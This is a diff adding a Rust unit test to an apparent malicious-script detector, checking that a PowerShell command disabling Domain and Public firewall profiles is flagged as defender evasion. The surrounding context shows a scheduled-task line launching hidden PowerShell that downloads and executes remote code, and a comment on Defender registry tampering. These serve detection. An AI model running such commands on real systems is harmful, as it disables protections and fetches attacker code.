@@ -2995,6 +2995,23 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn powershell_positional_firewall_profile_disable_emits_defender_evasion_trait() {
+        let script = br#"powershell -Command "Set-NetFirewallProfile Domain,Public -Enabled False"
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "firewall-profile-disabled" && target == "Domain,Public"
+            )),
+            "missing positional PowerShell firewall profile disable: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn defender_registry_tampering_emits_evasion_trait() {
         // `reg add ...\Windows Defender\... /v DisableX /d 1` — flips
         // Defender policy keys to disable real-time / anti-spyware /
